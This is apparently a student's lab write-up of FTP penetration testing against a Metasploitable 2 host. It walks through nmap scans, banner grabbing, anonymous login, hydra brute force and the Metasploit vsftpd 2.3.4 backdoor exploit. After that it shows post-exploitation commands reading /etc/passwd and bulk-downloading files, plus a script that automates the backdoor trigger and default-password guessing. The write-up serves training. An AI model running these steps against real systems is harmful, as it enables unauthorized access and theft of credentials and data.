# FTP


## Scope
This document outlines the methodology for assessing the security of FTP services during penetration testing. It includes enumeration, vulnerability detection, exploitation, and documentation steps, with a focus on real-world lab scenarios.


## LAB TOOLS
- **Attacker**: Kali Linux
- **Target**: Metapsloitabe v2


# FTP Penetration Testing Methodology


## Information Gathering 

### Network Scanning
####  Initial Network Scan
````
nmap -sn -T4 192.168.127.0/24
````
<img width="692" height="378" alt="image" src="https://github.com/user-attachments/assets/212a7c1c-8278-4e2d-bad7-db03a276faad" />

#### Scan Service version detection
````
nmap -p 21 -sV 192.168.127.129
````
<img width="864" height="772" alt="image" src="https://github.com/user-attachments/assets/ac2bcb06-5089-4f5a-bc8c-0ebff121313d" />

#### Verify target is up
````
ping -c 3 192.168.127.129
````
<img width="656" height="211" alt="image" src="https://github.com/user-attachments/assets/7fa10c4e-5f6a-47a5-b2ed-a1f7f32ecf8e" />


### FTP Service Detection
#### Service version detection
````
nmap -p 21 -sV 192.168.127.129
````
<img width="961" height="274" alt="image" src="https://github.com/user-attachments/assets/ffbe7b34-0c1b-43be-8e1c-8ca0f090f2a0" />


#### verbose
````
nmap -sV -T 192.168.127.129
````
<img width="1233" height="713" alt="image" src="https://github.com/user-attachments/assets/afc9eaf4-9761-4486-9f5a-92b24b0fe790" />


---



## Enumeration
### Banner Grabbing
#### Using telnet
````
telnet 192.168.127.129 21
````
<img width="352" height="152" alt="image" src="https://github.com/user-attachments/assets/662cc0e9-575b-4883-a8e7-e526f9ee64b0" />

#### Using netcat
````
nc -nv 192.168.127.129 21
````
<img width="457" height="117" alt="image" src="https://github.com/user-attachments/assets/2be30983-b597-43e3-9ebe-353b988f98aa" />


#### Using bash
````
echo "" | nc 192.168.127.129 21
````
<img width="394" height="103" alt="image" src="https://github.com/user-attachments/assets/d31fabea-7401-44c8-a744-5d3d4b967bce" />


#### Using nmap scripts
````
nmap -p 21 --script banner 192.168.127.129
````
<img width="659" height="252" alt="image" src="https://github.com/user-attachments/assets/9c70021a-1e9d-4a66-91b4-b41720fef4ab" />



###  FTP Service Enumeration
#### FTP enumeration
````
nmap -p 21 --script ftp-syst,ftp-anon 192.168.127.129
````
<img width="656" height="503" alt="image" src="https://github.com/user-attachments/assets/82217349-df46-4db6-9f5c-f1548233b4b7" />

- `ftp-syst`: Retrieves system information from the FTP server.
- `ftp-anon`: Checks if anonymous login is allowed.


#### Check for specific vsftpd features
````
nmap -p 21 --script ftp-vsftpd-backdoor 192.168.127.129
````
<img width="1182" height="531" alt="image" src="https://github.com/user-attachments/assets/67eda13a-7219-4bf2-9f29-1a5fb447ec46" />

- `ftp-vsftpd-backdoor`: NSE script: Checks for a backdoor in vsftpd 2.3.4, a version known to allow remote shell access if exploited.


## Anonymous Access Testing
### Test Anonymous Login
####  Using ftp command
````
ftp 192.168.127.129
````
<img width="1048" height="639" alt="image" src="https://github.com/user-attachments/assets/b2f34c3e-b22b-4aa3-b448-31957875a295" />

````
Username: anonymous
Password: anonymous or press Enter.
````
- In this we got successful and some real system or server they block anonymous login.


#### Using curl and wget
````
curl ftp://anonymous:anonymous@192.168.127.129/
wget --ftp-user=anonymous --ftp-password=anonymous ftp://192.168.127.129/
````
<img width="1108" height="396" alt="image" src="https://github.com/user-attachments/assets/0dc7a94d-c2cf-4e7e-b60c-14845c448831" />

#### Automated check
````
nmap -p 21 --script ftp-anon 192.168.127.129
````
<img width="661" height="258" alt="image" src="https://github.com/user-attachments/assets/6bdef4d0-a4e4-4a20-a41a-2743d4e4cda3" />


###  Manual FTP Connection & Exploration
#### Connect to FTP 
````
ftp 192.168.127.129
````
<img width="599" height="474" alt="image" src="https://github.com/user-attachments/assets/050f1b4c-92a5-4d66-b625-b1e26eefb3c9" />

---




## Vulnerability Assessment
### Scan for Known Vulnerabilities
#### Scan for all FTP vulnerabilities
````
nmap -p 21 --script ftp-vuln* 192.168.127.129
````


- `--script ftp-vuln*`: Runs all scripts that start with `ftp-vuln`, which typically include:
    - `ftp-vuln-cve2010-4221`: Checks for a buffer overflow vulnerability in ProFTPD servers.
    - `ftp-vuln-cve2011-2523`:  Detects the vsftpd 2.3.4 backdoor (same as `ftp-vsftpd-backdoor`).
   

#### Specific vsftpd backdoor check
````
nmap -p 21 --script ftp-vsftpd-backdoor 192.168.127.129
````
<img width="1160" height="536" alt="image" src="https://github.com/user-attachments/assets/b081211c-41d0-4529-b543-3d40040a0a61" />

- Script `ftp-vsftpd-backdoor`: Checks for `CVE-2011-2523`, a malicious backdoor introduced in vsftpd version 2.3.4. If triggered, it may open a shell on port 6200.

#### Check for other common vulnerabilities
````
nmap -p 21 --script ftp-proftpd-backdoor,ftp-bounce 192.168.127.129
````
<img width="729" height="256" alt="image" src="https://github.com/user-attachments/assets/7a1becf9-aede-4a72-9c25-c23d4c009bb2" />

- `ftp-proftpd-backdoor`: Detects a backdoor in ProFTPD servers (`CVE-2010-3867`), specifically in versions that were compromised via a malicious source code mirror. If vulnerable, it may allow remote command execution.
- `ftp-bounce`: Tests whether the FTP server is vulnerable to the classic FTP bounce attack â€” an old-school vulnerability that allows port scanning of internal hosts via the FTP server.

---


## Authentication Testing

###  Default Credentials Testing
#### Using hydra for brute force
````
hydra -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/wordlist.txt ftp://192.168.127.129 -V
````
<img width="1901" height="759" alt="image" src="https://github.com/user-attachments/assets/e08fd18f-1b39-46e8-9cf6-7e0a40fe3165" />

<img width="1218" height="652" alt="image" src="https://github.com/user-attachments/assets/136cb32c-aa2a-4704-95b3-55b5ee9c0b1c" />

- We found the correct password.


#### Quick common passwords
````
hydra -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/wordlist.txt ftp://192.168.127.129 -t 4 -V
````
<img width="1435" height="709" alt="image" src="https://github.com/user-attachments/assets/6a7cb58e-5895-4711-acaf-d71aac4f1d7c" />

<img width="1172" height="505" alt="image" src="https://github.com/user-attachments/assets/ddeff40a-6084-4726-afd2-83d79a085627" />

- **Type**: If we want to brute force our target we need to know our `Username` of target, cause if we don't know username or password when we brute force we spend a lot time. But in this i just test i don't use with specific username.





## Exploitation
### VSFTPD 2.3.4 Backdoor Exploitation
#### Using Metasploit:
````
msfconsole -q
search vsftpd
use 1
````
- or we can use specific:
````
use exploit/unix/ftp/vsftpd_234_backdoor
show options
````
<img width="1585" height="800" alt="image" src="https://github.com/user-attachments/assets/e0c8f4a5-cd3a-47c6-9eb7-1455e1b5295c" />


````
set RHOST 192.168.127.129
show options
````
<img width="1581" height="499" alt="image" src="https://github.com/user-attachments/assets/309d646a-508a-4df6-a8c2-80d0f946c982" />

````
search type:payload name:interact
````
<img width="1567" height="475" alt="image" src="https://github.com/user-attachments/assets/aa016409-688b-4c67-9f20-d0339f6c1960" />


````
use 2
````
- OR we can use:
````
set PAYLOAD cmd/unix/interact
show info
````
<img width="705" height="491" alt="image" src="https://github.com/user-attachments/assets/fee2a785-9769-46a7-ae91-db6b637c352b" />

````
exploit
````
<img width="1140" height="634" alt="image" src="https://github.com/user-attachments/assets/b0830191-a95a-4660-a6ee-bb8b562b3e4b" />


#### Or we can specific type:
````
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.127.129
set PAYLOAD cmd/unix/interact
exploit
````
<img width="1132" height="792" alt="image" src="https://github.com/user-attachments/assets/d0e3db8b-89c4-47d1-85e7-f3cc732dae1f" />

---


## Post-Exploitation
- After we hacked into system we can input shell or others malware.

###  Once You Have Access
#### Via vsftpd backdoor:
````
pwd
ls -la
cd /home
ls -la
cat /etc/passwd
````
<img width="625" height="624" alt="image" src="https://github.com/user-attachments/assets/0f4fb5aa-8bc5-4ca1-a77b-e470c3d01753" />

### Data exifilteration
#### Download entire directory structure
````
wget -r --ftp-user=anonymous --ftp-password=anonymous ftp://192.168.127.129/
````
<img width="824" height="474" alt="image" src="https://github.com/user-attachments/assets/94074ce4-be7c-4607-9b67-a19d529d2d38" />
---

### System Exploration
#### Check network configuration
````
ifconfig
netstat -tulpn
````
<img width="995" height="623" alt="image" src="https://github.com/user-attachments/assets/7c063aac-fea5-43e2-8095-c00bd44b146e" />

#### Look for interesting files
````
find / -name "*.txt" -type f 2>/dev/null
find / -name "*.conf" -type f 2>/dev/null
find / -name "*.sh" -type f 2>/dev/null
````
- We can use this to find file, but it show a lot.

#### Check for other services
````
ps aux
ls -la /var/www/
````

---

## Automated Assessment Script
````
sudo mousepad ftp_automate.py
````
````
 #!/bin/bash
TARGET="192.168.127.129"
OUTPUT_DIR="ftp_assessment_$TARGET"
mkdir -p "$OUTPUT_DIR"

echo "[*] Starting FTP assessment of Metasploitable 2 ($TARGET)"

echo "[1] Service version detection..."
nmap -p 21 -sV $TARGET > "$OUTPUT_DIR/01_service_version.txt"

echo "[2] Banner grabbing..."
echo "" | nc $TARGET 21 > "$OUTPUT_DIR/02_banner.txt" 2>&1

echo "[3] Anonymous access check..."
nmap -p 21 --script ftp-anon $TARGET > "$OUTPUT_DIR/03_anonymous_nmap.txt"

echo "[4] Manual anonymous test..."
{
    echo "user anonymous anonymous"
    echo "ls -la"
    echo "quit"
} | ftp -n $TARGET > "$OUTPUT_DIR/04_anonymous_manual.txt" 2>&1

echo "[5] Vulnerability scanning..."
nmap -p 21 --script ftp-vuln* $TARGET > "$OUTPUT_DIR/05_vulnerabilities.txt"

echo "[6] Testing vsftpd backdoor..."
{
    echo "user hello:) password"
    echo "quit"
} | ftp -n $TARGET > "$OUTPUT_DIR/06_backdoor_test.txt" 2>&1

echo "[7] Testing default credentials..."
for user in msfadmin user admin test; do
    for pass in msfadmin user admin test; do
        {
            echo "user $user $pass"
            echo "ls"
            echo "quit"
        } | ftp -n $TARGET >> "$OUTPUT_DIR/07_credentials_test.txt" 2>&1
    done
done

echo "[*] Assessment complete. Results saved in $OUTPUT_DIR/"
````
````
sudo chmod +x ftp_authomate.py
sudo ./ftp_automate.py
````
<img width="788" height="463" alt="image" src="https://github.com/user-attachments/assets/55299f94-cd74-428c-869e-45f37043f6ef" />

- Check it:
````
cd ftp_assessment_192.168.127.129/ 
cat 01_service_version.txt
````
<img width="1037" height="440" alt="image" src="https://github.com/user-attachments/assets/2f065020-685a-4c91-96e8-65137118baa3" />

- In this we can search file that we want.

----



---
## Summery Metasploit Modules for Comprehensive Testing
````
msfconsole
````

### FTP version detection
````
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.127.129
run
````

# Anonymous FTP check
````
use auxiliary/scanner/ftp/anonymous
set RHOSTS 192.168.127.129
run
````


# FTP login scanner
````
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.127.129
set USERNAME msfadmin
set PASSWORD msfadmin
run
````


# vsftpd backdoor exploit
````
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.127.129
exploit
````
---

=====>> Finished OF FTP
---

## References
1. https://www.youtube.com/watch?v=Y3YJPqUw5k8
2. https://hackviser.com/tactics/pentesting/services/ftp
---

----
## Credits
- **Practice Lab:** Conducted by *Nin Kanong(k4n0ng)*
- **Documentation:** Compiled by *Nin Kanong(k4n0ng)*

### Date: 13/10/2025
-----
